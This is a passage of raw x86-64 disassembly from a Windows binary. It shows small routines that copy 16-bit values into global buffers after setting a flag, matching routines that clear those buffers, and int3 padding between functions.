   140008d9c:	cc                   	int3
   140008d9d:	cc                   	int3
   140008d9e:	cc                   	int3
   140008d9f:	cc                   	int3
   140008da0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008da3:	0f 11 05 72 ae 2b 00 	movups %xmm0,0x2bae72(%rip)        # 0x1402c3c1c
   140008daa:	0f 11 05 5f ae 2b 00 	movups %xmm0,0x2bae5f(%rip)        # 0x1402c3c10
   140008db1:	0f 11 05 48 ae 2b 00 	movups %xmm0,0x2bae48(%rip)        # 0x1402c3c00
   140008db8:	0f 11 05 31 ae 2b 00 	movups %xmm0,0x2bae31(%rip)        # 0x1402c3bf0
   140008dbf:	c3                   	ret
   140008dc0:	c6 05 a5 ae 2b 00 01 	movb   $0x1,0x2baea5(%rip)        # 0x1402c3c6c
   140008dc7:	0f b7 01             	movzwl (%rcx),%eax
   140008dca:	66 89 05 5f ae 2b 00 	mov    %ax,0x2bae5f(%rip)        # 0x1402c3c30
   140008dd1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008dd5:	66 89 05 56 ae 2b 00 	mov    %ax,0x2bae56(%rip)        # 0x1402c3c32
   140008ddc:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008de0:	66 89 05 4d ae 2b 00 	mov    %ax,0x2bae4d(%rip)        # 0x1402c3c34
   140008de7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008deb:	66 89 05 44 ae 2b 00 	mov    %ax,0x2bae44(%rip)        # 0x1402c3c36
   140008df2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008df6:	66 89 05 3b ae 2b 00 	mov    %ax,0x2bae3b(%rip)        # 0x1402c3c38
   140008dfd:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008e01:	66 89 05 32 ae 2b 00 	mov    %ax,0x2bae32(%rip)        # 0x1402c3c3a
   140008e08:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140008e0c:	66 89 05 29 ae 2b 00 	mov    %ax,0x2bae29(%rip)        # 0x1402c3c3c
   140008e13:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008e17:	66 89 05 20 ae 2b 00 	mov    %ax,0x2bae20(%rip)        # 0x1402c3c3e
   140008e1e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008e22:	66 89 05 17 ae 2b 00 	mov    %ax,0x2bae17(%rip)        # 0x1402c3c40
   140008e29:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140008e2d:	66 89 05 0e ae 2b 00 	mov    %ax,0x2bae0e(%rip)        # 0x1402c3c42
   140008e34:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008e38:	66 89 05 05 ae 2b 00 	mov    %ax,0x2bae05(%rip)        # 0x1402c3c44
   140008e3f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008e43:	66 89 05 fc ad 2b 00 	mov    %ax,0x2badfc(%rip)        # 0x1402c3c46
   140008e4a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140008e4e:	66 89 05 f3 ad 2b 00 	mov    %ax,0x2badf3(%rip)        # 0x1402c3c48
   140008e55:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008e59:	66 89 05 ea ad 2b 00 	mov    %ax,0x2badea(%rip)        # 0x1402c3c4a
   140008e60:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008e64:	66 89 05 e1 ad 2b 00 	mov    %ax,0x2bade1(%rip)        # 0x1402c3c4c
   140008e6b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140008e6f:	66 89 05 d8 ad 2b 00 	mov    %ax,0x2badd8(%rip)        # 0x1402c3c4e
   140008e76:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140008e7a:	66 89 05 cf ad 2b 00 	mov    %ax,0x2badcf(%rip)        # 0x1402c3c50
   140008e81:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008e85:	66 89 05 c6 ad 2b 00 	mov    %ax,0x2badc6(%rip)        # 0x1402c3c52
   140008e8c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008e90:	66 89 05 bd ad 2b 00 	mov    %ax,0x2badbd(%rip)        # 0x1402c3c54
   140008e97:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   140008e9b:	66 89 05 b4 ad 2b 00 	mov    %ax,0x2badb4(%rip)        # 0x1402c3c56
   140008ea2:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008ea6:	66 89 05 ab ad 2b 00 	mov    %ax,0x2badab(%rip)        # 0x1402c3c58
   140008ead:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140008eb1:	66 89 05 a2 ad 2b 00 	mov    %ax,0x2bada2(%rip)        # 0x1402c3c5a
   140008eb8:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   140008ebc:	66 89 05 99 ad 2b 00 	mov    %ax,0x2bad99(%rip)        # 0x1402c3c5c
   140008ec3:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140008ec7:	66 89 05 90 ad 2b 00 	mov    %ax,0x2bad90(%rip)        # 0x1402c3c5e
   140008ece:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140008ed2:	66 89 05 87 ad 2b 00 	mov    %ax,0x2bad87(%rip)        # 0x1402c3c60
   140008ed9:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   140008edd:	66 89 05 7e ad 2b 00 	mov    %ax,0x2bad7e(%rip)        # 0x1402c3c62
   140008ee4:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140008ee8:	66 89 05 75 ad 2b 00 	mov    %ax,0x2bad75(%rip)        # 0x1402c3c64
   140008eef:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140008ef3:	66 89 05 6c ad 2b 00 	mov    %ax,0x2bad6c(%rip)        # 0x1402c3c66
   140008efa:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   140008efe:	66 89 05 63 ad 2b 00 	mov    %ax,0x2bad63(%rip)        # 0x1402c3c68
   140008f05:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140008f09:	66 89 05 5a ad 2b 00 	mov    %ax,0x2bad5a(%rip)        # 0x1402c3c6a
   140008f10:	c3                   	ret
   140008f11:	cc                   	int3
   140008f12:	cc                   	int3
   140008f13:	cc                   	int3
   140008f14:	cc                   	int3
   140008f15:	cc                   	int3
   140008f16:	cc                   	int3
   140008f17:	cc                   	int3
   140008f18:	cc                   	int3
   140008f19:	cc                   	int3
   140008f1a:	cc                   	int3
   140008f1b:	cc                   	int3
   140008f1c:	cc                   	int3
   140008f1d:	cc                   	int3
   140008f1e:	cc                   	int3
   140008f1f:	cc                   	int3
   140008f20:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008f23:	0f 11 05 32 ad 2b 00 	movups %xmm0,0x2bad32(%rip)        # 0x1402c3c5c
   140008f2a:	0f 11 05 1f ad 2b 00 	movups %xmm0,0x2bad1f(%rip)        # 0x1402c3c50
   140008f31:	0f 11 05 08 ad 2b 00 	movups %xmm0,0x2bad08(%rip)        # 0x1402c3c40
   140008f38:	0f 11 05 f1 ac 2b 00 	movups %xmm0,0x2bacf1(%rip)        # 0x1402c3c30
   140008f3f:	c3                   	ret
   140008f40:	c6 05 61 ad 2b 00 01 	movb   $0x1,0x2bad61(%rip)        # 0x1402c3ca8
   140008f47:	0f b7 01             	movzwl (%rcx),%eax
   140008f4a:	66 89 05 1f ad 2b 00 	mov    %ax,0x2bad1f(%rip)        # 0x1402c3c70
   140008f51:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008f55:	66 89 05 16 ad 2b 00 	mov    %ax,0x2bad16(%rip)        # 0x1402c3c72
   140008f5c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008f60:	66 89 05 0d ad 2b 00 	mov    %ax,0x2bad0d(%rip)        # 0x1402c3c74
   140008f67:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008f6b:	66 89 05 04 ad 2b 00 	mov    %ax,0x2bad04(%rip)        # 0x1402c3c76
   140008f72:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008f76:	66 89 05 fb ac 2b 00 	mov    %ax,0x2bacfb(%rip)        # 0x1402c3c78
   140008f7d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008f81:	66 89 05 f2 ac 2b 00 	mov    %ax,0x2bacf2(%rip)        # 0x1402c3c7a
   140008f88:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140008f8c:	66 89 05 e9 ac 2b 00 	mov    %ax,0x2bace9(%rip)        # 0x1402c3c7c
   140008f93:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008f97:	66 89 05 e0 ac 2b 00 	mov    %ax,0x2bace0(%rip)        # 0x1402c3c7e
   140008f9e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008fa2:	66 89 05 d7 ac 2b 00 	mov    %ax,0x2bacd7(%rip)        # 0x1402c3c80
   140008fa9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140008fad:	66 89 05 ce ac 2b 00 	mov    %ax,0x2bacce(%rip)        # 0x1402c3c82
   140008fb4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008fb8:	66 89 05 c5 ac 2b 00 	mov    %ax,0x2bacc5(%rip)        # 0x1402c3c84
   140008fbf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008fc3:	66 89 05 bc ac 2b 00 	mov    %ax,0x2bacbc(%rip)        # 0x1402c3c86
   140008fca:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140008fce:	66 89 05 b3 ac 2b 00 	mov    %ax,0x2bacb3(%rip)        # 0x1402c3c88
   140008fd5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008fd9:	66 89 05 aa ac 2b 00 	mov    %ax,0x2bacaa(%rip)        # 0x1402c3c8a
   140008fe0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008fe4:	66 89 05 a1 ac 2b 00 	mov    %ax,0x2baca1(%rip)        # 0x1402c3c8c
   140008feb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140008fef:	66 89 05 98 ac 2b 00 	mov    %ax,0x2bac98(%rip)        # 0x1402c3c8e
   140008ff6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140008ffa:	66 89 05 8f ac 2b 00 	mov    %ax,0x2bac8f(%rip)        # 0x1402c3c90
   140009001:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009005:	66 89 05 86 ac 2b 00 	mov    %ax,0x2bac86(%rip)        # 0x1402c3c92
   14000900c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009010:	66 89 05 7d ac 2b 00 	mov    %ax,0x2bac7d(%rip)        # 0x1402c3c94
   140009017:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000901b:	66 89 05 74 ac 2b 00 	mov    %ax,0x2bac74(%rip)        # 0x1402c3c96
   140009022:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009026:	66 89 05 6b ac 2b 00 	mov    %ax,0x2bac6b(%rip)        # 0x1402c3c98
   14000902d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140009031:	66 89 05 62 ac 2b 00 	mov    %ax,0x2bac62(%rip)        # 0x1402c3c9a
   140009038:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   14000903c:	66 89 05 59 ac 2b 00 	mov    %ax,0x2bac59(%rip)        # 0x1402c3c9c
   140009043:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140009047:	66 89 05 50 ac 2b 00 	mov    %ax,0x2bac50(%rip)        # 0x1402c3c9e
   14000904e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140009052:	66 89 05 47 ac 2b 00 	mov    %ax,0x2bac47(%rip)        # 0x1402c3ca0
   140009059:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000905d:	66 89 05 3e ac 2b 00 	mov    %ax,0x2bac3e(%rip)        # 0x1402c3ca2
   140009064:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140009068:	66 89 05 35 ac 2b 00 	mov    %ax,0x2bac35(%rip)        # 0x1402c3ca4
   14000906f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140009073:	66 89 05 2c ac 2b 00 	mov    %ax,0x2bac2c(%rip)        # 0x1402c3ca6
   14000907a:	c3                   	ret
   14000907b:	cc                   	int3
   14000907c:	cc                   	int3
   14000907d:	cc                   	int3
   14000907e:	cc                   	int3
   14000907f:	cc                   	int3
   140009080:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009083:	0f 11 05 06 ac 2b 00 	movups %xmm0,0x2bac06(%rip)        # 0x1402c3c90
   14000908a:	0f 11 05 ef ab 2b 00 	movups %xmm0,0x2babef(%rip)        # 0x1402c3c80
   140009091:	0f 11 05 d8 ab 2b 00 	movups %xmm0,0x2babd8(%rip)        # 0x1402c3c70
   140009098:	48 c7 05 fd ab 2b 00 	movq   $0x0,0x2babfd(%rip)        # 0x1402c3ca0
   14000909f:	00 00 00 00 
   1400090a3:	c3                   	ret
   1400090a4:	cc                   	int3
   1400090a5:	cc                   	int3
   1400090a6:	cc                   	int3
   1400090a7:	cc                   	int3
   1400090a8:	cc                   	int3
   1400090a9:	cc                   	int3
   1400090aa:	cc                   	int3
   1400090ab:	cc                   	int3
   1400090ac:	cc                   	int3
   1400090ad:	cc                   	int3
   1400090ae:	cc                   	int3
   1400090af:	cc                   	int3
   1400090b0:	c6 05 31 ac 2b 00 01 	movb   $0x1,0x2bac31(%rip)        # 0x1402c3ce8
   1400090b7:	0f b7 01             	movzwl (%rcx),%eax
   1400090ba:	66 89 05 ef ab 2b 00 	mov    %ax,0x2babef(%rip)        # 0x1402c3cb0
   1400090c1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   1400090c5:	66 89 05 e6 ab 2b 00 	mov    %ax,0x2babe6(%rip)        # 0x1402c3cb2
   1400090cc:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   1400090d0:	66 89 05 dd ab 2b 00 	mov    %ax,0x2babdd(%rip)        # 0x1402c3cb4
   1400090d7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400090db:	66 89 05 d4 ab 2b 00 	mov    %ax,0x2babd4(%rip)        # 0x1402c3cb6
   1400090e2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400090e6:	66 89 05 cb ab 2b 00 	mov    %ax,0x2babcb(%rip)        # 0x1402c3cb8
   1400090ed:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400090f1:	66 89 05 c2 ab 2b 00 	mov    %ax,0x2babc2(%rip)        # 0x1402c3cba
   1400090f8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400090fc:	66 89 05 b9 ab 2b 00 	mov    %ax,0x2babb9(%rip)        # 0x1402c3cbc
   140009103:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009107:	66 89 05 b0 ab 2b 00 	mov    %ax,0x2babb0(%rip)        # 0x1402c3cbe
   14000910e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009112:	66 89 05 a7 ab 2b 00 	mov    %ax,0x2baba7(%rip)        # 0x1402c3cc0
   140009119:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000911d:	66 89 05 9e ab 2b 00 	mov    %ax,0x2bab9e(%rip)        # 0x1402c3cc2
   140009124:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009128:	66 89 05 95 ab 2b 00 	mov    %ax,0x2bab95(%rip)        # 0x1402c3cc4
   14000912f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009133:	66 89 05 8c ab 2b 00 	mov    %ax,0x2bab8c(%rip)        # 0x1402c3cc6
   14000913a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000913e:	66 89 05 83 ab 2b 00 	mov    %ax,0x2bab83(%rip)        # 0x1402c3cc8
   140009145:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009149:	66 89 05 7a ab 2b 00 	mov    %ax,0x2bab7a(%rip)        # 0x1402c3cca
   140009150:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009154:	66 89 05 71 ab 2b 00 	mov    %ax,0x2bab71(%rip)        # 0x1402c3ccc
   14000915b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000915f:	66 89 05 68 ab 2b 00 	mov    %ax,0x2bab68(%rip)        # 0x1402c3cce
   140009166:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000916a:	66 89 05 5f ab 2b 00 	mov    %ax,0x2bab5f(%rip)        # 0x1402c3cd0
   140009171:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009175:	66 89 05 56 ab 2b 00 	mov    %ax,0x2bab56(%rip)        # 0x1402c3cd2
   14000917c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009180:	66 89 05 4d ab 2b 00 	mov    %ax,0x2bab4d(%rip)        # 0x1402c3cd4
   140009187:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000918b:	66 89 05 44 ab 2b 00 	mov    %ax,0x2bab44(%rip)        # 0x1402c3cd6
   140009192:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009196:	66 89 05 3b ab 2b 00 	mov    %ax,0x2bab3b(%rip)        # 0x1402c3cd8
   14000919d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   1400091a1:	66 89 05 32 ab 2b 00 	mov    %ax,0x2bab32(%rip)        # 0x1402c3cda
   1400091a8:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   1400091ac:	66 89 05 29 ab 2b 00 	mov    %ax,0x2bab29(%rip)        # 0x1402c3cdc
   1400091b3:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   1400091b7:	66 89 05 20 ab 2b 00 	mov    %ax,0x2bab20(%rip)        # 0x1402c3cde
   1400091be:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   1400091c2:	66 89 05 17 ab 2b 00 	mov    %ax,0x2bab17(%rip)        # 0x1402c3ce0
   1400091c9:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   1400091cd:	66 89 05 0e ab 2b 00 	mov    %ax,0x2bab0e(%rip)        # 0x1402c3ce2
   1400091d4:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   1400091d8:	66 89 05 05 ab 2b 00 	mov    %ax,0x2bab05(%rip)        # 0x1402c3ce4
   1400091df:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   1400091e3:	66 89 05 fc aa 2b 00 	mov    %ax,0x2baafc(%rip)        # 0x1402c3ce6
   1400091ea:	c3                   	ret
   1400091eb:	cc                   	int3
   1400091ec:	cc                   	int3
   1400091ed:	cc                   	int3
   1400091ee:	cc                   	int3
   1400091ef:	cc                   	int3
   1400091f0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400091f3:	0f 11 05 d6 aa 2b 00 	movups %xmm0,0x2baad6(%rip)        # 0x1402c3cd0
   1400091fa:	0f 11 05 bf aa 2b 00 	movups %xmm0,0x2baabf(%rip)        # 0x1402c3cc0
   140009201:	0f 11 05 a8 aa 2b 00 	movups %xmm0,0x2baaa8(%rip)        # 0x1402c3cb0
   140009208:	48 c7 05 cd aa 2b 00 	movq   $0x0,0x2baacd(%rip)        # 0x1402c3ce0
   14000920f:	00 00 00 00 
   140009213:	c3                   	ret
   140009214:	cc                   	int3
   140009215:	cc                   	int3
   140009216:	cc                   	int3
   140009217:	cc                   	int3
   140009218:	cc                   	int3
   140009219:	cc                   	int3
   14000921a:	cc                   	int3
   14000921b:	cc                   	int3
   14000921c:	cc                   	int3
   14000921d:	cc                   	int3
   14000921e:	cc                   	int3
   14000921f:	cc                   	int3
   140009220:	c6 05 f3 aa 2b 00 01 	movb   $0x1,0x2baaf3(%rip)        # 0x1402c3d1a
   140009227:	0f b7 01             	movzwl (%rcx),%eax
   14000922a:	66 89 05 bf aa 2b 00 	mov    %ax,0x2baabf(%rip)        # 0x1402c3cf0
   140009231:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009235:	66 89 05 b6 aa 2b 00 	mov    %ax,0x2baab6(%rip)        # 0x1402c3cf2
   14000923c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009240:	66 89 05 ad aa 2b 00 	mov    %ax,0x2baaad(%rip)        # 0x1402c3cf4
   140009247:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000924b:	66 89 05 a4 aa 2b 00 	mov    %ax,0x2baaa4(%rip)        # 0x1402c3cf6
   140009252:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140009256:	66 89 05 9b aa 2b 00 	mov    %ax,0x2baa9b(%rip)        # 0x1402c3cf8
   14000925d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140009261:	66 89 05 92 aa 2b 00 	mov    %ax,0x2baa92(%rip)        # 0x1402c3cfa
   140009268:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000926c:	66 89 05 89 aa 2b 00 	mov    %ax,0x2baa89(%rip)        # 0x1402c3cfc
   140009273:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009277:	66 89 05 80 aa 2b 00 	mov    %ax,0x2baa80(%rip)        # 0x1402c3cfe
   14000927e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009282:	66 89 05 77 aa 2b 00 	mov    %ax,0x2baa77(%rip)        # 0x1402c3d00
   140009289:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000928d:	66 89 05 6e aa 2b 00 	mov    %ax,0x2baa6e(%rip)        # 0x1402c3d02
   140009294:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009298:	66 89 05 65 aa 2b 00 	mov    %ax,0x2baa65(%rip)        # 0x1402c3d04
   14000929f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400092a3:	66 89 05 5c aa 2b 00 	mov    %ax,0x2baa5c(%rip)        # 0x1402c3d06
   1400092aa:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400092ae:	66 89 05 53 aa 2b 00 	mov    %ax,0x2baa53(%rip)        # 0x1402c3d08
   1400092b5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400092b9:	66 89 05 4a aa 2b 00 	mov    %ax,0x2baa4a(%rip)        # 0x1402c3d0a
   1400092c0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400092c4:	66 89 05 41 aa 2b 00 	mov    %ax,0x2baa41(%rip)        # 0x1402c3d0c
   1400092cb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400092cf:	66 89 05 38 aa 2b 00 	mov    %ax,0x2baa38(%rip)        # 0x1402c3d0e
   1400092d6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400092da:	66 89 05 2f aa 2b 00 	mov    %ax,0x2baa2f(%rip)        # 0x1402c3d10
   1400092e1:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   1400092e5:	66 89 05 26 aa 2b 00 	mov    %ax,0x2baa26(%rip)        # 0x1402c3d12
   1400092ec:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   1400092f0:	66 89 05 1d aa 2b 00 	mov    %ax,0x2baa1d(%rip)        # 0x1402c3d14
   1400092f7:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   1400092fb:	66 89 05 14 aa 2b 00 	mov    %ax,0x2baa14(%rip)        # 0x1402c3d16
   140009302:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009306:	66 89 05 0b aa 2b 00 	mov    %ax,0x2baa0b(%rip)        # 0x1402c3d18
   14000930d:	c3                   	ret
   14000930e:	cc                   	int3
   14000930f:	cc                   	int3
   140009310:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009313:	0f 11 05 f0 a9 2b 00 	movups %xmm0,0x2ba9f0(%rip)        # 0x1402c3d0a
   14000931a:	0f 29 05 df a9 2b 00 	movaps %xmm0,0x2ba9df(%rip)        # 0x1402c3d00
   140009321:	0f 29 05 c8 a9 2b 00 	movaps %xmm0,0x2ba9c8(%rip)        # 0x1402c3cf0
   140009328:	c3                   	ret
   140009329:	cc                   	int3
   14000932a:	cc                   	int3
   14000932b:	cc                   	int3
   14000932c:	cc                   	int3
   14000932d:	cc                   	int3
   14000932e:	cc                   	int3
   14000932f:	cc                   	int3
   140009330:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009333:	0f 29 05 36 aa 2b 00 	movaps %xmm0,0x2baa36(%rip)        # 0x1402c3d70
   14000933a:	0f 29 05 1f aa 2b 00 	movaps %xmm0,0x2baa1f(%rip)        # 0x1402c3d60
   140009341:	0f 29 05 08 aa 2b 00 	movaps %xmm0,0x2baa08(%rip)        # 0x1402c3d50
   140009348:	0f 29 05 f1 a9 2b 00 	movaps %xmm0,0x2ba9f1(%rip)        # 0x1402c3d40
   14000934f:	0f 29 05 da a9 2b 00 	movaps %xmm0,0x2ba9da(%rip)        # 0x1402c3d30
   140009356:	0f 29 05 c3 a9 2b 00 	movaps %xmm0,0x2ba9c3(%rip)        # 0x1402c3d20
   14000935d:	66 c7 05 1a aa 2b 00 	movw   $0x0,0x2baa1a(%rip)        # 0x1402c3d80
   140009364:	00 00 
   140009366:	c3                   	ret
   140009367:	cc                   	int3
   140009368:	cc                   	int3
   140009369:	cc                   	int3
   14000936a:	cc                   	int3
   14000936b:	cc                   	int3
   14000936c:	cc                   	int3
   14000936d:	cc                   	int3
   14000936e:	cc                   	int3
   14000936f:	cc                   	int3
   140009370:	c6 05 3b aa 2b 00 01 	movb   $0x1,0x2baa3b(%rip)        # 0x1402c3db2
   140009377:	0f b7 01             	movzwl (%rcx),%eax
   14000937a:	66 89 05 0f aa 2b 00 	mov    %ax,0x2baa0f(%rip)        # 0x1402c3d90
   140009381:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009385:	66 89 05 06 aa 2b 00 	mov    %ax,0x2baa06(%rip)        # 0x1402c3d92
   14000938c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009390:	66 89 05 fd a9 2b 00 	mov    %ax,0x2ba9fd(%rip)        # 0x1402c3d94
   140009397:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000939b:	66 89 05 f4 a9 2b 00 	mov    %ax,0x2ba9f4(%rip)        # 0x1402c3d96
   1400093a2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400093a6:	66 89 05 eb a9 2b 00 	mov    %ax,0x2ba9eb(%rip)        # 0x1402c3d98
   1400093ad:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400093b1:	66 89 05 e2 a9 2b 00 	mov    %ax,0x2ba9e2(%rip)        # 0x1402c3d9a
   1400093b8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400093bc:	66 89 05 d9 a9 2b 00 	mov    %ax,0x2ba9d9(%rip)        # 0x1402c3d9c
   1400093c3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400093c7:	66 89 05 d0 a9 2b 00 	mov    %ax,0x2ba9d0(%rip)        # 0x1402c3d9e
   1400093ce:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400093d2:	66 89 05 c7 a9 2b 00 	mov    %ax,0x2ba9c7(%rip)        # 0x1402c3da0
   1400093d9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400093dd:	66 89 05 be a9 2b 00 	mov    %ax,0x2ba9be(%rip)        # 0x1402c3da2
   1400093e4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400093e8:	66 89 05 b5 a9 2b 00 	mov    %ax,0x2ba9b5(%rip)        # 0x1402c3da4
   1400093ef:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400093f3:	66 89 05 ac a9 2b 00 	mov    %ax,0x2ba9ac(%rip)        # 0x1402c3da6
   1400093fa:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400093fe:	66 89 05 a3 a9 2b 00 	mov    %ax,0x2ba9a3(%rip)        # 0x1402c3da8
   140009405:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009409:	66 89 05 9a a9 2b 00 	mov    %ax,0x2ba99a(%rip)        # 0x1402c3daa
   140009410:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009414:	66 89 05 91 a9 2b 00 	mov    %ax,0x2ba991(%rip)        # 0x1402c3dac
   14000941b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000941f:	66 89 05 88 a9 2b 00 	mov    %ax,0x2ba988(%rip)        # 0x1402c3dae
   140009426:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000942a:	66 89 05 7f a9 2b 00 	mov    %ax,0x2ba97f(%rip)        # 0x1402c3db0
   140009431:	c3                   	ret
   140009432:	cc                   	int3
   140009433:	cc                   	int3
   140009434:	cc                   	int3
   140009435:	cc                   	int3
   140009436:	cc                   	int3
   140009437:	cc                   	int3
   140009438:	cc                   	int3
   140009439:	cc                   	int3
   14000943a:	cc                   	int3
   14000943b:	cc                   	int3
   14000943c:	cc                   	int3
   14000943d:	cc                   	int3
   14000943e:	cc                   	int3
   14000943f:	cc                   	int3
   140009440:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009443:	0f 29 05 56 a9 2b 00 	movaps %xmm0,0x2ba956(%rip)        # 0x1402c3da0
   14000944a:	0f 29 05 3f a9 2b 00 	movaps %xmm0,0x2ba93f(%rip)        # 0x1402c3d90
   140009451:	66 c7 05 56 a9 2b 00 	movw   $0x0,0x2ba956(%rip)        # 0x1402c3db0
   140009458:	00 00 
   14000945a:	c3                   	ret
   14000945b:	cc                   	int3
   14000945c:	cc                   	int3
   14000945d:	cc                   	int3
